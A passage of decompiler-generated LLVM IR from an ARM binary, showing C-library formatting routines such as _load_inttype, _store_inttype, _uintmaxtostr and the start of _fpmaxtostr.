dec_label_pc_166bc:                               ; preds = %.dec_label_pc_166bc_crit_edge, %dec_label_pc_16684, %dec_label_pc_1669c
  %v2_166cc = phi i32 [ %v0_166bc.pre, %.dec_label_pc_166bc_crit_edge ], [ %v0_1668c, %dec_label_pc_16684 ], [ %v0_1668c, %dec_label_pc_1669c ]
  %v1_166bc = inttoptr i32 %v2_166cc to i32*
  %v2_166bc = load i32, i32* %v1_166bc, align 4
  store i32 %v2_166bc, i32* %r3.global-to-local, align 4
  %v1_166c0 = add i32 %v2_166cc, 8
  %v2_166c0 = inttoptr i32 %v1_166c0 to i32*
  %v3_166c0 = load i32, i32* %v2_166c0, align 4
  store i32 %v3_166c0, i32* %r1.global-to-local, align 4
  %v1_166c4 = and i32 %v2_166bc, -4
  store i32 %v1_166c4, i32* %r3.global-to-local, align 4
  %v3_166c8 = sdiv i32 %v2_166bc, 256
  store i32 %v3_166c8, i32* %r2.global-to-local, align 4
  %v1_166cc = trunc i32 %v3_166c8 to i8
  %v3_166cc = add i32 %v2_166cc, 1
  %v4_166cc = inttoptr i32 %v3_166cc to i8*
  store i8 %v1_166cc, i8* %v4_166cc, align 1
  %v0_166d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_166d0 = load i32, i32* @r4, align 4
  %v2_166d0 = add i32 %v1_166d0, 20
  %v3_166d0 = inttoptr i32 %v2_166d0 to i32*
  store i32 %v0_166d0, i32* %v3_166d0, align 4
  %v0_166d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_166d4 = trunc i32 %v0_166d4 to i8
  %v2_166d4 = load i32, i32* @r4, align 4
  %v3_166d4 = inttoptr i32 %v2_166d4 to i8*
  store i8 %v1_166d4, i8* %v3_166d4, align 1
  %v0_166d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_166d8 = load i32, i32* @r4, align 4
  %v2_166d8 = add i32 %v1_166d8, 24
  %v3_166d8 = inttoptr i32 %v2_166d8 to i32*
  store i32 %v0_166d8, i32* %v3_166d8, align 4
  %v0_166dc = load i32, i32* %r1.global-to-local, align 4
  %v1_166dc = load i32, i32* @r4, align 4
  %v2_166dc = add i32 %v1_166dc, 16
  %v3_166dc = inttoptr i32 %v2_166dc to i32*
  store i32 %v0_166dc, i32* %v3_166dc, align 4
  %v0_166e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_166e0

dec_label_pc_166e0:                               ; preds = %dec_label_pc_1667c, %dec_label_pc_166bc
  %v2_166ec = phi i32 [ %v0_1668c, %dec_label_pc_1667c ], [ %v0_166e0.pre, %dec_label_pc_166bc ]
  %v1_166e0 = inttoptr i32 %v2_166ec to i32*
  %v2_166e0 = load i32, i32* %v1_166e0, align 4
  %v1_166e4 = or i32 %v2_166e0, 64
  store i32 %v1_166e4, i32* %r2.global-to-local, align 4
  %v3_166e8 = sdiv i32 %v2_166e0, 256
  store i32 %v3_166e8, i32* %r3.global-to-local, align 4
  %v1_166ec = trunc i32 %v3_166e8 to i8
  %v3_166ec = add i32 %v2_166ec, 1
  %v4_166ec = inttoptr i32 %v3_166ec to i8*
  store i8 %v1_166ec, i8* %v4_166ec, align 1
  %v0_166f0 = load i32, i32* @r4, align 4
  %v1_166f0 = add i32 %v0_166f0, 1
  %v2_166f0 = inttoptr i32 %v1_166f0 to i8*
  %v3_166f0 = load i8, i8* %v2_166f0, align 1
  %v4_166f0 = zext i8 %v3_166f0 to i32
  %v3_166f4 = mul nuw nsw i32 %v4_166f0, 256
  store i32 %v3_166f4, i32* %r3.global-to-local, align 4
  %v1_166f8 = and i32 %v3_166f4, 2816
  store i32 %v1_166f8, i32* %r0.global-to-local, align 4
  %v2_166f8 = icmp eq i32 %v1_166f8, 0
  store i1 %v2_166f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_166f8, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_166e0
  %v2_166fc = add i32 %v0_166f0, 12
  %v3_166fc = inttoptr i32 %v2_166fc to i32*
  %v4_166fc = load i32, i32* %v3_166fc, align 4
  store i32 %v4_166fc, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_166e0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_16704 = load i32, i32* %r2.global-to-local, align 4
  %v1_16704 = trunc i32 %v0_16704 to i8
  %v3_16704 = inttoptr i32 %v0_166f0 to i8*
  store i8 %v1_16704, i8* %v3_16704, align 1
  %v0_16708 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16708, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_16708 = load i32, i32* %r3.global-to-local, align 4
  %v2_16708 = load i32, i32* @r4, align 4
  %v3_16708 = add i32 %v2_16708, 28
  %v4_16708 = inttoptr i32 %v3_16708 to i32*
  store i32 %v1_16708, i32* %v4_16708, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_1670c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1670c, i32* @r4, align 4
  %v8_1670c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_1670c

; uselistorder directives
  uselistorder i32 %v3_166f4, { 1, 0 }
  uselistorder i32 %v3_166e8, { 1, 0 }
  uselistorder i32 %v3_166c8, { 1, 0 }
  uselistorder i32 %v2_166cc, { 0, 2, 1 }
  uselistorder i1 %v2_1667c, { 1, 0 }
  uselistorder i32 %v3_16668, { 1, 0 }
  uselistorder i32 %v0_1668c, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_16634, { 1, 0 }
  uselistorder i32 %v5_16618, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_166e0, { 1, 0 }
  uselistorder label %dec_label_pc_166bc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_166a4, { 1, 0 }
  uselistorder label %dec_label_pc_16654, { 1, 0 }
  uselistorder label %dec_label_pc_16640, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_16710 = load i32, i32* @r2, align 4
  %v1_16710 = icmp slt i32 %v0_16710, 0
  %v0_16714 = load i32, i32* @r0, align 4
  %v1_16718 = and i32 %v0_16714, 2048
  %v2_1674c = icmp eq i32 %v1_16718, 0
  br i1 %v1_16710, label %dec_label_pc_1674c, label %dec_label_pc_16720

dec_label_pc_16720:                               ; preds = %entry
  br i1 %v2_1674c, label %dec_label_pc_16728, label %dec_label_pc_16754

dec_label_pc_16728:                               ; preds = %dec_label_pc_16720
  %v7_16728 = icmp eq i32 %v0_16714, 256
  %v0_1672c = load i32, i32* @r1, align 4
  %v1_1672c = inttoptr i32 %v0_1672c to i32*
  %v2_1672c = load i32, i32* %v1_1672c, align 4
  %v2_16730 = urem i32 %v2_1672c, 256
  %v2_16730.v2_1672c = select i1 %v7_16728, i32 %v2_16730, i32 %v2_1672c
  br i1 %v7_16728, label %.thread, label %dec_label_pc_16738

dec_label_pc_16738:                               ; preds = %dec_label_pc_16728
  %v7_16738 = icmp eq i32 %v0_16714, 512
  br i1 %v7_16738, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16738
  %v4_16740 = urem i32 %v2_16730.v2_1672c, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16738, %dec_label_pc_16728, %bb
  %v1_16748 = phi i32 [ %v2_1672c, %dec_label_pc_16738 ], [ %v2_16730, %dec_label_pc_16728 ], [ %v4_16740, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_16748

dec_label_pc_1674c:                               ; preds = %entry
  br i1 %v2_1674c, label %dec_label_pc_1675c, label %dec_label_pc_16754

dec_label_pc_16754:                               ; preds = %dec_label_pc_16720, %dec_label_pc_1674c
  %v0_16754 = load i32, i32* @r1, align 4
  %v1_16754 = inttoptr i32 %v0_16754 to i32*
  %v2_16754 = load i32, i32* %v1_16754, align 4
  %v3_16754 = add i32 %v0_16754, 4
  %v4_16754 = inttoptr i32 %v3_16754 to i32*
  %v5_16754 = load i32, i32* %v4_16754, align 4
  store i32 %v5_16754, i32* @r1, align 4
  ret i32 %v2_16754

dec_label_pc_1675c:                               ; preds = %dec_label_pc_1674c
  %v7_1675c = icmp eq i32 %v0_16714, 256
  %v0_16760 = load i32, i32* @r1, align 4
  %v1_16760 = inttoptr i32 %v0_16760 to i32*
  %v2_16760 = load i32, i32* %v1_16760, align 4
  %v2_16764 = urem i32 %v2_16760, 256
  %v2_16764.v2_16760 = select i1 %v7_1675c, i32 %v2_16764, i32 %v2_16760
  br i1 %v7_1675c, label %.thread2, label %dec_label_pc_1676c

dec_label_pc_1676c:                               ; preds = %dec_label_pc_1675c
  %v7_1676c = icmp eq i32 %v0_16714, 512
  br i1 %v7_1676c, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_1676c
  %v4_16770 = mul i32 %v2_16764.v2_16760, 65536
  %v4_16774 = sdiv i32 %v4_16770, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1676c, %dec_label_pc_1675c, %bb5
  %v0_16778 = phi i32 [ %v2_16760, %dec_label_pc_1676c ], [ %v2_16764, %dec_label_pc_1675c ], [ %v4_16774, %bb5 ]
  %v3_16778 = ashr i32 %v0_16778, 31
  store i32 %v3_16778, i32* @r1, align 4
  ret i32 %v0_16778

; uselistorder directives
  uselistorder i32 %v0_16778, { 1, 0 }
  uselistorder i32 %v2_16764, { 1, 0 }
  uselistorder i32 %v2_16760, { 1, 2, 0 }
  uselistorder i32 %v2_16730, { 1, 0 }
  uselistorder i32 %v2_1672c, { 1, 2, 0 }
  uselistorder i1 %v2_1674c, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16754, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_16780 = icmp eq i32 %arg2, 256
  br i1 %v7_16780, label %dec_label_pc_167ac, label %dec_label_pc_16788

dec_label_pc_16788:                               ; preds = %entry
  %v7_16788 = icmp eq i32 %arg2, 2048
  br i1 %v7_16788, label %dec_label_pc_16790, label %dec_label_pc_16798

dec_label_pc_16790:                               ; preds = %dec_label_pc_16788
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_16790 = add i32 %tmp2, 4
  %v6_16790 = inttoptr i32 %v5_16790 to i32*
  store i32 %arg4, i32* %v6_16790, align 4
  ret i32 %tmp2

dec_label_pc_16798:                               ; preds = %dec_label_pc_16788
  %v7_16798 = icmp eq i32 %arg2, 512
  br i1 %v7_16798, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_16798
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_16798
  %v4_1679c = sdiv i32 %arg3, 256
  %v1_167a8 = trunc i32 %v4_1679c to i8
  %v4_167a8 = add i32 %tmp2, 1
  %v5_167a8 = inttoptr i32 %v4_167a8 to i8*
  store i8 %v1_167a8, i8* %v5_167a8, align 1
  br label %dec_label_pc_167ac

dec_label_pc_167ac:                               ; preds = %entry, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i8* %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_167ac, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_167b8 = icmp slt i32 %arg4, 0
  %v2_167b8 = icmp eq i32 %arg4, 0
  store i1 %v2_167b8, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_167b8, label %dec_label_pc_167d0, label %dec_label_pc_167f0

dec_label_pc_167d0:                               ; preds = %entry
  %v1_167d0 = icmp slt i32 %arg3, 0
  %v2_167d0 = icmp eq i32 %arg3, 0
  store i1 %v2_167d0, i1* %cpsr_z.global-to-local, align 1
  %v1_167d4 = sub i32 0, %arg4
  store i32 %v1_167d4, i32* %r7.global-to-local, align 4
  br i1 %v1_167d0, label %dec_label_pc_167dc, label %dec_label_pc_167f0

dec_label_pc_167dc:                               ; preds = %dec_label_pc_167d0
  %v1_167e0 = sub i32 0, %arg2
  store i32 %v1_167e0, i32* %r5.global-to-local, align 4
  %v2_167e0 = icmp eq i32 %arg2, 0
  %v2_167e4 = icmp eq i1 %v2_167e0, false
  %v5_167e4 = sext i1 %v2_167e4 to i32
  %v6_167e4 = sub i32 %v5_167e4, %arg3
  store i32 %v6_167e4, i32* %r6.global-to-local, align 4
  %v19_167e4 = icmp eq i32 %v6_167e4, 0
  store i1 %v19_167e4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_167f8

dec_label_pc_167f0:                               ; preds = %dec_label_pc_167d0, %entry
  br label %dec_label_pc_167f8

dec_label_pc_167f8:                               ; preds = %dec_label_pc_167dc, %dec_label_pc_167f0
  %storemerge = phi i8 [ 0, %dec_label_pc_167f0 ], [ 1, %dec_label_pc_167dc ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_16800 = load i32, i32* %r7.global-to-local, align 4
  %v2_16808 = udiv i32 -1, %v0_16800
  store i32 %v2_16808, i32* %fp.global-to-local, align 4
  %v2_16818 = urem i32 -1, %v0_16800
  %v1_1681c = add i32 %v2_16818, 1
  store i32 %v1_1681c, i32* %sb.global-to-local, align 4
  %v9_16820 = icmp eq i32 %v1_1681c, %v0_16800
  store i1 %v9_16820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16820, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_167f8
  %v1_16824 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_16824, i32* %sb.global-to-local, align 4
  %v2_16828 = add i32 %v2_16808, 1
  store i32 %v2_16828, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_167f8, %bb
  %v0_1682c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1682c, i32* %sl.global-to-local, align 4
  %v0_16830 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16830, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16834

dec_label_pc_16834thread-pre-split:               ; preds = %bb21
  %v0_16834.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_1683c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16834

dec_label_pc_16834:                               ; preds = %dec_label_pc_16834thread-pre-split, %.thread
  %v0_168a4 = phi i32 [ %v0_1683c.pre, %dec_label_pc_16834thread-pre-split ], [ %v0_16800, %.thread ]
  %v0_16850 = phi i32 [ %v0_16834.pr, %dec_label_pc_16834thread-pre-split ], [ %v0_1682c, %.thread ]
  %v2_16834 = icmp eq i32 %v0_16850, 0
  store i1 %v2_16834, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16834, label %dec_label_pc_168a0, label %dec_label_pc_16844

dec_label_pc_16844:                               ; preds = %dec_label_pc_16834
  %v2_16844 = urem i32 %v0_16850, %v0_168a4
  %v2_16854 = udiv i32 %v0_16850, %v0_168a4
  store i32 %v2_16854, i32* %sl.global-to-local, align 4
  %v0_16860 = load i32, i32* %r6.global-to-local, align 4
  %v2_16864 = urem i32 %v0_16860, %v0_168a4
  %v1_1686c = load i32, i32* %sb.global-to-local, align 4
  %v3_1686c = mul i32 %v1_1686c, %v2_16844
  %v4_1686c = add i32 %v3_1686c, %v2_16864
  store i32 %v4_1686c, i32* %r5.global-to-local, align 4
  %v2_16874 = udiv i32 %v0_16860, %v0_168a4
  %v0_1687c = load i32, i32* %fp.global-to-local, align 4
  %v3_1687c = mul i32 %v0_1687c, %v2_16844
  %v4_1687c = add i32 %v3_1687c, %v2_16874
  %v2_16884 = udiv i32 %v4_1686c, %v0_168a4
  %v2_1688c = add i32 %v4_1687c, %v2_16884
  br label %dec_label_pc_168c0

dec_label_pc_168a0:                               ; preds = %dec_label_pc_16834
  %v0_168a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_168b8 = udiv i32 %v0_168a0, %v0_168a4
  br label %dec_label_pc_168c0

dec_label_pc_168c0:                               ; preds = %dec_label_pc_16844, %dec_label_pc_168a0
  %storemerge24 = phi i32 [ %v2_168b8, %dec_label_pc_168a0 ], [ %v2_1688c, %dec_label_pc_16844 ]
  %v0_168dc = phi i32 [ %v2_168b8, %dec_label_pc_168a0 ], [ %v2_1688c, %dec_label_pc_16844 ]
  %v1_168dc = phi i32 [ 0, %dec_label_pc_168a0 ], [ %v2_16854, %dec_label_pc_16844 ]
  %v4_1686c.pn = phi i32 [ %v0_168a0, %dec_label_pc_168a0 ], [ %v4_1686c, %dec_label_pc_16844 ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_168c8 = urem i32 %v4_1686c.pn, %v0_168a4
  %v3_168c0 = load i32, i32* %stack_var_0, align 4
  %v2_168c4 = icmp ugt i32 %v0_168c8, 8
  %v7_168c4 = icmp eq i32 %v0_168c8, 9
  store i1 %v7_168c4, i1* %cpsr_z.global-to-local, align 1
  %v1_168cc = add i32 %v0_168c8, 48
  %v0_168d4 = load i32, i32* %r8.global-to-local, align 4
  %v1_168d4 = add i32 %v0_168d4, -1
  store i32 %v1_168d4, i32* %r8.global-to-local, align 4
  %v2_168d8 = xor i1 %v7_168c4, true
  %v3_168d8 = and i1 %v2_168c4, %v2_168d8
  %extract.t = trunc i32 %v1_168cc to i8
  br i1 %v3_168d8, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_168c0
  %v2_168c8 = add i32 %v3_168c0, %v0_168c8
  %extract.t8 = trunc i32 %v2_168c8 to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_168c0, %bb20
  %v0_168e0.off0 = phi i8 [ %extract.t, %dec_label_pc_168c0 ], [ %extract.t8, %bb20 ]
  %v2_168dc = or i32 %v0_168dc, %v1_168dc
  %v4_168dc = icmp eq i32 %v2_168dc, 0
  store i1 %v4_168dc, i1* %cpsr_z.global-to-local, align 1
  %v3_168e0 = inttoptr i32 %v1_168d4 to i8*
  store i8 %v0_168e0.off0, i8* %v3_168e0, align 1
  %v0_168e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_168e4, label %dec_label_pc_168e8, label %dec_label_pc_16834thread-pre-split

dec_label_pc_168e8:                               ; preds = %bb21
  %v2_168e8 = load i8, i8* %stack_var_-40, align 1
  %v2_168ec = icmp eq i8 %v2_168e8, 0
  store i1 %v2_168ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168ec, label %dec_label_pc_168e8..thread2_crit_edge, label %bb22

dec_label_pc_168e8..thread2_crit_edge:            ; preds = %dec_label_pc_168e8
  %v0_168f8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_168e8
  %v3_168f4 = load i32, i32* %r8.global-to-local, align 4
  %v4_168f4 = add i32 %v3_168f4, -1
  %v5_168f4 = inttoptr i32 %v4_168f4 to i8*
  store i8 45, i8* %v5_168f4, align 1
  %v6_168f4 = load i32, i32* %r8.global-to-local, align 4
  %v7_168f4 = add i32 %v6_168f4, -1
  store i32 %v7_168f4, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_168e8..thread2_crit_edge, %bb22
  %v0_168f8 = phi i32 [ %v0_168f8.pre, %dec_label_pc_168e8..thread2_crit_edge ], [ %v7_168f4, %bb22 ]
  ret i32 %v0_168f8

; uselistorder directives
  uselistorder i32 %v0_168c8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_168a4, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_168c0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_167f8, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp183 = bitcast float %tmp to i32
  store i32 %tmp183, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-42 = alloca i8, align 1
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-43 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-78 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16904 = load i32, i32* @r4, align 4
  store i32 %v3_16904, i32* %stack_var_-36, align 4
  %v1_16908 = add i32 %arg4, 8
  %v2_16908 = inttoptr i32 %v1_16908 to i8*
  %v3_16908 = load i8, i8* %v2_16908, align 1
  %v4_16908 = zext i8 %v3_16908 to i32
  store i32 %v4_16908, i32* %sl.global-to-local, align 4
  store i32 %arg4, i32* %stack_var_-200, align 4
  %v1_16914 = or i32 %v4_16908, 32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_16918 = icmp ult i32 %v1_16914, 97
  store i1 %v6_16918, i1* %cpsr_n.global-to-local, align 1
  %v7_16918 = icmp eq i32 %v1_16914, 97
  store i1 %v7_16918, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  store i32 %tmp183, i32* %r6.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_1692c = inttoptr i32 %arg4 to i32*
  %v2_1692c = load i32, i32* %v1_1692c, align 4
  store i32 %v2_1692c, i32* %r1.global-to-local, align 4
  br i1 %v7_16918, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_16930 = add nuw nsw i32 %v4_16908, 6
  store i32 %v2_16930, i32* %r3.global-to-local, align 4
  %v2_16938 = urem i32 %v2_16930, 256
  store i32 %v2_16938, i32* %sl.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %v2_1692c, i32* %ip.global-to-local, align 4
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  %v1_16950 = add i32 %arg4, 12
  %v2_16950 = inttoptr i32 %v1_16950 to i32*
  %v3_16950 = load i32, i32* %v2_16950, align 4
  store i32 %v3_16950, i32* %r2.global-to-local, align 4
  %v1_16954 = add i32 %arg4, 4
  %v2_16954 = inttoptr i32 %v1_16954 to i32*
  %v3_16954 = load i32, i32* %v2_16954, align 4
  store i32 %v3_16954, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16958 = icmp slt i32 %v2_1692c, 0
  store i1 %v1_16958, i1* %cpsr_n.global-to-local, align 1
  %v2_16958 = icmp eq i32 %v2_1692c, 0
  store i1 %v2_16958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_16958, label %bb223, label %bb224

bb223:                                            ; preds = %.thread
  store i32 6, i32* %ip.global-to-local, align 4
  br label %bb224

bb224:                                            ; preds = %.thread, %bb223
  %v1_16cb8 = phi i32 [ %v2_1692c, %.thread ], [ 6, %bb223 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_16964 = and i32 %v3_16950, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16964 = icmp eq i32 %v1_16964, 0
  store i1 %v2_16964, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-42, align 1
  br i1 %v2_16964, label %dec_label_pc_1697c, label %dec_label_pc_16988

dec_label_pc_1697c:                               ; preds = %bb224
  %v1_1697c = urem i32 %v3_16950, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1697c = icmp eq i32 %v1_1697c, 0
  store i1 %v2_1697c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1697c, label %dec_label_pc_1698c, label %dec_label_pc_16988

dec_label_pc_16988:                               ; preds = %dec_label_pc_1697c, %bb224
  %storemerge = phi i32 [ 43, %bb224 ], [ 32, %dec_label_pc_1697c ]
  %v0_16988.off0 = phi i8 [ 43, %bb224 ], [ 32, %dec_label_pc_1697c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_16988.off0, i8* %stack_var_-42, align 1
  br label %dec_label_pc_1698c

dec_label_pc_1698c:                               ; preds = %dec_label_pc_1697c, %dec_label_pc_16988
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %tmp183, i32* %r2.global-to-local, align 4
  %v7_169a8 = fcmp ord double %arg2, 0.000000e+00
  %not.v7_169a8 = xor i1 %v7_169a8, true
  %v9_169a8 = sext i1 %not.v7_169a8 to i32
  store i32 %v9_169a8, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %not.v7_169a8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_169a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_169a8, label %dec_label_pc_169bc, label %bb226

bb226:                                            ; preds = %dec_label_pc_1698c
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16a70

dec_label_pc_169bc:                               ; preds = %dec_label_pc_1698c
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_169cc = fcmp ogt double %arg2, 0.000000e+00
  %v7_169cc = fcmp oeq double %arg2, 0.000000e+00
  %v8_169cc = select i1 %v6_169cc, i32 1, i32 -1
  %v9_169cc = select i1 %v7_169cc, i32 0, i32 %v8_169cc
  store i32 %v9_169cc, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_169d0 = icmp slt i32 %v9_169cc, 0
  store i1 %v1_169d0, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_169cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_169cc, label %dec_label_pc_169d8, label %bb227

dec_label_pc_169d8:                               ; preds = %dec_label_pc_169bc
  %v10_169e8 = fdiv double 0x3FF000003FD00000, %arg2
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_169f4 = fcmp ogt double %v10_169e8, 0.000000e+00
  %v7_169f4 = zext i1 %v6_169f4 to i32
  store i32 %v7_169f4, i32* %r0.global-to-local, align 4
